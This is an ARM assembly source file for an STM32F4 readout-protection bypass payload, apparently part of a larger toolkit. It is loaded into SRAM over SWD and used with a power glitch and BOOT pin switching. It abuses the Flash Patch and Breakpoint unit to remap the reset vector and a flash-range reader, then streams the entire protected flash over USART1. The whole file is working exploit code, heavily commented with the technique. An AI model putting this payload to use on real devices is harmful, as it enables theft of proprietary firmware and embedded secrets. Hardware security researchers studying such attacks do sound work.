/*
 * STM32F4 (F405/F407/F427/F429...) RDP1 Bypass — BYPASS payload
 *
 * F4-specific port of stm32_payloads/f1/rdp_bypass.S. Same launch contract and
 * host protocol as the F1 BYPASS payload, so target_power_bypass() drives it
 * unchanged via the per-family payload descriptor.
 *
 * Launch (identical to F1 BYPASS): host writes this payload to SRAM over SWD,
 * sets BOOT0=1/BOOT1=1, POR-glitches so the chip SRAM-boots and slides down the
 * NOP sled into stage 1 (which configures the FPB), then BOOT0=0 + nRST makes
 * the CPU flash-boot with the FPB redirecting the reset vector into stage 2.
 *
 * KEY F4 DIFFERENCE vs F1: on F1, stage 2 (running from SRAM) can read flash
 * directly under RDP1. On F4 the flash controller blocks reads unless the PC is
 * in the flash address range, so stage 2 CANNOT do a plain `ldr` from flash.
 * We therefore use the FPB "reader" trick (as in the F1 diag payload): a 2nd
 * FPB comparator remaps an instruction fetch at 0x08000100 to a tiny reader in
 * SRAM (`ldr r0,[r0]; bx lr`). Calling `blx 0x08000101` runs that reader with
 * PC in flash range, so the flash controller permits the data read.
 *
 * Loaded at 0x20000000 (SRAM-boot aliases SRAM to 0x00000000, so the vector
 * table must sit at 0x20000000 — same as the F1 BYPASS payload). If the F4
 * SRAM-boot path turns out to need a different base (e.g. the 0x20004000 the
 * bootloader-Go scripts use), change load_base in the descriptor AND the
 * absolute addresses below together.
 *
 * F4 peripheral map: RCC @ 0x40023800 (AHB1ENR +0x30, APB2ENR +0x44),
 * GPIOA @ 0x40020000 (MODER/AFR model), USART1 @ 0x40011000, PA9 = TX (AF7),
 * BRR = 0x8B for 115200 baud at the 16 MHz HSI (F4 reset default clock).
 *
 * Protocol: "RDP1" + CPUID (4 bytes LE) + continuous flash bytes (LE words).
 */
.syntax unified
.thumb
.cpu cortex-m4

.section .text

/* ========== Vector table (loaded at 0x20000000) ========== */
.word 0x20005000          /* Initial SP (top of 20KB) */
.word nop_sled + 1        /* Reset vector -> NOP sled */

/* NOP sled: 0x20000008 .. 0x200001FF (252 NOPs). Covers SRAM-boot entry.
 * 0x20000020 / 0x20000024 are inside the sled — stage 1 overwrites them with
 * the FPB remap slots (stage2 addr + reader function). */
nop_sled:
.rept 252
    nop
.endr

/* ========== STAGE 1: Configure FPB (runs from SRAM boot) ========== */
stage1_start:
    /* Write stage 2 thumb address to remap slot 0 (0x20000020) */
    ldr r0, =stage2_start + 1
    ldr r1, =0x20000020
    str r0, [r1]

    /* Write FPB reader function to remap slot 1 (0x20000024):
     * ldr r0,[r0] = 0x6800, bx lr = 0x4770 -> combined LE word 0x47706800 */
    ldr r0, =0x47706800
    ldr r1, =0x20000024
    str r0, [r1]

    /* Configure FPB */
    ldr r0, =0xE0002000    /* FPB base */
    movs r1, #3            /* FP_CTRL: ENABLE + KEY */
    str r1, [r0, #0]
    movs r1, #0x20         /* FP_REMAP: remap base 0x20000020 (bits[28:5]) */
    str r1, [r0, #4]
    movs r1, #0x05         /* FP_COMP0: ENABLE + match addr 0x04 (reset vector) */
    str r1, [r0, #8]
    ldr r1, =0x08000101    /* FP_COMP1: ENABLE + match addr 0x08000100 (reader) */
    str r1, [r0, #0x0C]

    /* Infinite loop — wait for host to switch BOOT0 and pulse nRST */
stage1_wait:
    b stage1_wait

/* ========== STAGE 2: Flash Dump via UART (runs after nRST, FPB active) ===== */
.align 2
stage2_start:
    ldr sp, =0x20005000

    /* Enable GPIOA clock: RCC_AHB1ENR |= (1<<0) */
    ldr r0, =0x40023830    /* RCC_AHB1ENR */
    ldr r1, [r0]
    orrs r1, r1, #1        /* GPIOAEN */
    str r1, [r0]

    /* Enable USART1 clock: RCC_APB2ENR |= (1<<4) */
    ldr r0, =0x40023844    /* RCC_APB2ENR */
    ldr r1, [r0]
    orr r1, r1, #0x10      /* USART1EN */
    str r1, [r0]

    ldr r2, =50000
1:  subs r2, #1
    bne 1b

    /* PA9 -> AF mode: GPIOA_MODER[19:18] = 0b10 */
    ldr r0, =0x40020000    /* GPIOA_MODER */
    ldr r1, [r0]
    bic r1, r1, #(0x3 << 18)
    orr r1, r1, #(0x2 << 18)
    str r1, [r0]

    /* PA9 -> AF7 (USART1): GPIOA_AFRH[7:4] = 7 (pin9 is in AFRH) */
    ldr r0, =0x40020024    /* GPIOA_AFRH */
    ldr r1, [r0]
    bic r1, r1, #(0xF << 4)
    orr r1, r1, #(0x7 << 4)
    str r1, [r0]

    /* USART1: BRR = 0x8B (115200 @ 16MHz HSI) */
    ldr r0, =0x40011008    /* USART1_BRR */
    movs r1, #0x8B
    str r1, [r0]
    ldr r0, =0x4001100C    /* USART1_CR1 */
    movw r1, #0x2008       /* UE (bit13) + TE (bit3) */
    str r1, [r0]

    movs r2, #200
2:  subs r2, #1
    bne 2b

    ldr r4, =0x40011000    /* USART1 base */

    /* Header "RDP1" */
    movs r0, #0x52         /* 'R' */
    bl uart_send_byte
    movs r0, #0x44         /* 'D' */
    bl uart_send_byte
    movs r0, #0x50         /* 'P' */
    bl uart_send_byte
    movs r0, #0x31         /* '1' */
    bl uart_send_byte

    /* CPUID (4 bytes LE) */
    ldr r5, =0xE000ED00
    ldr r3, [r5]
    bl send_word

    /* Dump flash via FPB reader at 0x08000101 (thumb). PC lands in flash
     * range so the flash controller permits the read under RDP1. */
    ldr r5, =0x08000000    /* Flash address to read */
    ldr r6, =0x08000101    /* FPB reader function (thumb) */
dump_loop:
    mov r0, r5
    blx r6                 /* r0 = *(uint32_t*)r0 */
    mov r3, r0
    bl send_word
    adds r5, #4
    b dump_loop

/* ========== Send word in r3 (4 bytes LE); clobbers r0-r2 ========== */
send_word:
    push {lr}
    mov r0, r3
    bl uart_send_byte
    lsrs r0, r3, #8
    bl uart_send_byte
    lsrs r0, r3, #16
    bl uart_send_byte
    lsrs r0, r3, #24
    bl uart_send_byte
    pop {pc}

/* ========== UART helper (r4 = USART1 base) ========== */
uart_send_byte:
    and r0, r0, #0xFF
1:  ldr r1, [r4]          /* USART1_SR */
    tst r1, #0x80          /* TXE */
    beq 1b
    str r0, [r4, #4]      /* USART1_DR */
    bx lr

.pool
